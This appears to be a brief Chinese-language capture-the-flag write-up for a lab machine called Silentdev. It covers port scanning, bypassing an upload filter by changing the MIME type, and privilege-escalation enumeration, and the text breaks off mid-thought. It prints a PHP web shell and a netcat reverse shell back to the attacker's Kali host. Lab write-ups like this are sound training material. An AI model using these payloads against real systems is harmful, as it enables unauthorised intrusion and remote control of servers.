# Silentdev(med)
nmap扫描
![](vx_images/569335666002309.png)
web页面直白的一个文件上传
看源码upload.php
![](vx_images/523507250014459.png)
扫描到uploads目录
![](vx_images/538646504122654.png)
bp抓包测试了一下
直接修改mime头绕过
```
<?php
system('$_REQUEST[cmd]');
```
不知道为什么system一执行就出错500,换eval
上线webshell再把权限传回kali
```
nc 192.168.56.101 4444 -e /bin/bash
```
升级shell
```
python3 -c "import pty; pty.spawn('/bin/sh -i')"bash也不行
```
使用
```
script -qc /bin/bash /dev/null
```
![](vx_images/418824821130726.png)
看到web用户在1004组
刚好符合权限可以查看用户
但是没什么东西
尝试sudo,suid提权,也没啥利用
计划任务也没啥
感觉突破点在组的权限上
查看可以通过组来访问的文件
```
find / -group developers 2>/dev/null
```
![](vx_images/593317574785733.png)
/opt/project中有一个html文件将其放在html目录下查看
![](vx_images/469967722326549.png)
猜想可能有developer的密码?
尝试ssh登录没成功
看一下backups目录
![](vx_images/437083918260225.png)
解压后是一个相同的html文件
突然意识到可以




